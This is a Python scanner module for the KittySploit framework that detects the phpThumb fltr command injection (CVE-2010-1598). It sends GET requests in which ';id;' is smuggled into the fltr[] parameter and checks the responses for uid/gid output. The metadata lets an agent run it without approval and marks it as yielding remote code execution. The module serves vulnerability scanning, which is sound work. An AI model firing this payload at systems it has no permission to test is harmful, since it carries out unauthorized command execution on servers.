#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""phpThumb fltr command injection (CVE-2010-1598)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'phpThumb - fltr Command Injection Detection (CVE-2010-1598)',
        'description': (
            'Detects CVE-2010-1598 by injecting ;id; into phpThumb.php fltr[]=blur|...'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2010', 'phpthumb', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2010-1598',
        ],
        'cve': 'CVE-2010-1598',
    }

    def run(self):
        inj = (
            '/phpThumb.php?src=/home/example.com/public_html/vt.jpg&fltr[]=blur|'
            '5%20-quality%2075%20-interlace%20line%20%22/home/example.com/public_html/vt.jpg%22%20jpeg:%22'
            '/home/example.com/public_html/vt.jpg%22;id;&phpThumbDebug=9'
        )
        for base in ('', '/phpthumb', '/phpThumb', '/thumb'):
            path = f'{base}{inj}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='phpThumb fltr command injection (CVE-2010-1598)',
                    path=f'{base}/phpThumb.php',
                )
                return True
        return False
